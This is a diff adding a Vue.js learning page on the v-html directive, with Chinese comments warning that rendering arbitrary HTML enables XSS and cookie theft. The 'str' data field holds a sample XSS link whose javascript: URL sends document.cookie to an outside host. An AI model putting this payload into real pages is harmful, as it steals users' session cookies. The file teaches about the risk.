@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>v-html</title>
+    <script src="../vue.js"></script>
+</head>
+
+<body>
+    <div id="root">
+        <!-- v-html支持解析模板语法，可以写标签 -->
+        <div v-html="msg"></div>
+
+        <!-- v-html有安全性问题，动态渲染任意DOM节点容易导致XSS攻击，拿到用户的cookie等于拿到了用户的账号密码 -->
+        <div v-html="str"></div>
+    </div>
+
+    <script>
+        const vm = new Vue({
+            el: '#root',
+            data() {
+                return {
+                    msg: '<h1>你好</h1>',
+                    str: '<a href="javascript:location.href="http://www.baidu.com?"+document.cookie">资源</a>'
+                }
+            }
+        })
+    </script>
+</body>
+
+</html>
